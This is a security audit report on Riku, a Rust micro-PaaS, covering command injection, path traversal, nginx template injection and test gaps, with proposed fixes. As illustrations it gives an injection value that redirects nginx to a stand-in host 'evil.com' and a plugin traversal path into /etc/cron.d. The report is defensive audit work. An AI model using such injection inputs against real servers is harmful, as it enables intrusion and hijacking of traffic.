# Riku Codebase Audit Report

**Date:** 2026-02-24
**Scope:** Full codebase review (~12K LOC, 32 source files)
**Focus:** Security vulnerabilities, bugs, code quality, test coverage

---

## Overview

Riku is a Rust micro-PaaS with clean modular architecture across 4 modules (cli, deploy, supervisor, nginx). The codebase is well-structured but has several security and quality issues, particularly around input validation and command execution boundaries.

---

## Critical Issues

### 1. Command Injection via git-shell

**File:** `src/cli/git.rs:158-161`
**Severity:** CRITICAL

App names are interpolated into a shell command string passed to `git-shell`:

```rust
let shell_cmd = format!("git-receive-pack '{}'", app);
Command::new("git-shell").arg("-c").arg(&shell_cmd)
```

If `sanitize_app_name()` has any bypass (e.g. single quotes), this allows arbitrary command execution.

**Fix:** Call `git-receive-pack` directly with `.arg()` instead of going through `git-shell -c`:

```rust
let status = Command::new("git-receive-pack")
    .arg(&app)
    .current_dir(&paths.git_root)
    .status()?;
```

### 2. Path Traversal in App Name Sanitization

**File:** `src/util.rs:147-157`
**Severity:** CRITICAL

`sanitize_app_name()` allows `.` characters, meaning `..` passes through. Combined with `paths.app_root.join(&app)`, this enables directory traversal:

```rust
// "my..app" or ".." passes the filter
stripped.chars().filter(|c| c.is_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
```

**Fix:** Reject names containing `..` or that are empty after sanitization:

```rust
pub fn sanitize_app_name(app: &str) -> String {
    let stripped = app.trim_start_matches('/');
    let sanitized = stripped
        .chars()
        .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
        .collect::<String>()
        .trim_end()
        .to_string();

    if sanitized.contains("..") || sanitized.is_empty() {
        return String::new();
    }
    sanitized
}
```

### 3. Unsanitized Procfile Command Execution

**File:** `src/deploy/mod.rs:216-231, 314-336`
**Severity:** CRITICAL

Preflight and release commands from Procfiles execute via `sh -c` with no validation or sandboxing. Anyone who can `git push` gets full shell access on the server.

**Fix:** Document the security model clearly. Consider running deployed processes under restricted users or namespaces.

### 4. Nginx Template Injection

**File:** `src/nginx.rs:118-127`
**Severity:** CRITICAL

ENV values are inserted directly into nginx Tera templates without sanitization:

```rust
for (key, value) in env {
    context.insert(key, value);  // No sanitization
}
```

A malicious `NGINX_SERVER_NAME=example.com; proxy_pass http://evil.com;` could inject nginx directives.

**Fix:** Validate and escape nginx-sensitive values before template insertion. Implement an allowlist for special characters in nginx-related variables.

---

## High Severity Issues

### 5. Plugin Path Traversal

**File:** `src/plugins.rs:13-18`
**Severity:** HIGH

Plugin names aren't validated for path separators. `run_plugin("../../etc/cron.d/evil", ...)` could execute arbitrary files.

**Fix:** Reject plugin names containing `/` or `\\`:

```rust
if plugin_name.contains('/') || plugin_name.contains('\\') {
    return Err(anyhow::anyhow!("Invalid plugin name"));
}
```

### 6. Race Condition in File Locking

**File:** `src/util.rs:116-136`
**Severity:** HIGH

`atomic_write_with_lock()` has a TOCTOU race between checking lock existence and acquiring it. Lock file naming based on extension could also cause collisions between unrelated files.

**Fix:** Use advisory file locking on the target file itself, or use file-specific lock names.

### 7. Symlink Following Without Bounds Checking

**Files:** `src/cli/git.rs:19-32`, `src/cli/apps.rs:358-371`
**Severity:** HIGH

`fs::canonicalize()` follows symlinks but doesn't verify the resolved path stays within the riku directory tree. Combined with `fs::remove_dir_all()`, this could delete arbitrary directories.

**Fix:** Validate that canonicalized paths remain under `~/.riku/`.

### 8. Orphaned Processes on Error

**File:** `src/supervisor/process.rs:136-155`
**Severity:** HIGH

If `SpawnedProcess::new()` fails after `cmd.spawn()`, the child process leaks with no cleanup.

**Fix:** Use RAII or explicit error handling to terminate the child process on failure.

---

## Medium Severity Issues

### 9. Incorrect Cron Bounds

**File:** `src/util.rs:465`
**Severity:** MEDIUM

Limits array is `[59, 24, 31, 12, 7]`. Hour max should be 23, weekday max should be 6.

**Fix:** Change to `[59, 23, 31, 12, 6]`.

### 10. Missing ENV Value Validation

**File:** `src/util.rs:576-594`
**Severity:** MEDIUM

`parse_settings()` accepts values with newlines, null bytes, and shell metacharacters without validation. These values propagate to shell commands and nginx configs.

**Fix:** Strip or reject dangerous characters in environment variable values.

### 11. Silent Error Swallowing

**File:** `src/cli/apps.rs:894-903`
**Severity:** MEDIUM

`multi_tail()` silently ignores file read errors, hiding I/O failures or file descriptor exhaustion.

**Fix:** Log errors when file reading fails.

### 12. Predictable Temp Paths in Tests

**File:** `tests/deploy/test-all.sh`
**Severity:** MEDIUM

Uses `/tmp/riku-test-$$` (predictable PID-based path), vulnerable to symlink attacks.

**Fix:** Use `mktemp -d` instead.

---

## Test Coverage Gaps

| Area                        | Status              |
|-----------------------------|---------------------|
| Basic CLI operations        | 19 tests - adequate |
| Supervisor config parsing   | 22 tests - adequate |
| Nginx template rendering    | 15 tests - adequate |
| Plugin system               | 16 tests - adequate |
| E2E deployment simulation   | 11 tests - adequate |
| **Command injection**       | **0 tests - MISSING** |
| **Path traversal**          | **0 tests - MISSING** |
| **Template injection**      | **0 tests - MISSING** |
| **Concurrent deployments**  | **0 tests - MISSING** |
| **Real process spawning**   | **0 tests - MISSING** |
| **Failure/error scenarios** | **0 tests - MISSING** |

The test suite (83 tests) covers happy paths well but has zero security-focused tests.

---

## CI/CD Issues

- `cargo audit` is configured to silently succeed on failure (`|| echo "..."`) — vulnerabilities in dependencies will be ignored
- No `cargo-deny` for dependency policy enforcement
- Dependencies use loose version constraints (`"1"` instead of `"1.0"`)

---

## Missing Nginx Security Headers

The following headers are absent from nginx templates:

- `Content-Security-Policy`
- `Referrer-Policy`
- `Permissions-Policy`
- `Strict-Transport-Security` (HSTS) for HTTPS configurations

---

## Positive Observations

- Clean modular architecture with good separation of concerns
- Proper use of `anyhow::Result` for error handling throughout
- CodeQL scanning enabled in CI
- Nginx config validation before deployment (`validate_nginx_config`)
- Tests use `TempDir` for isolation
- Signal handling uses atomic operations correctly
- Release builds use LTO and binary stripping
- Multi-architecture release builds configured

---

## Priority Recommendations

| Priority    | Action                                                        | Issues |
|-------------|---------------------------------------------------------------|--------|
| Immediate   | Fix command injection in git-shell invocations                | #1     |
| Immediate   | Reject `..` in app name sanitization                          | #2     |
| Immediate   | Validate plugin names for path separators                     | #5     |
| Immediate   | Sanitize ENV values before nginx template insertion           | #4     |
| Short-term  | Add security-focused tests for all input boundaries           | All    |
| Short-term  | Document the trust/security model for Procfile execution      | #3     |
| Short-term  | Fix cron bounds, file locking race, and process cleanup       | #6-9   |
| Medium-term | Add HSTS and CSP headers to nginx templates                   | —      |
| Medium-term | Make `cargo audit` fail the build on vulnerabilities          | —      |
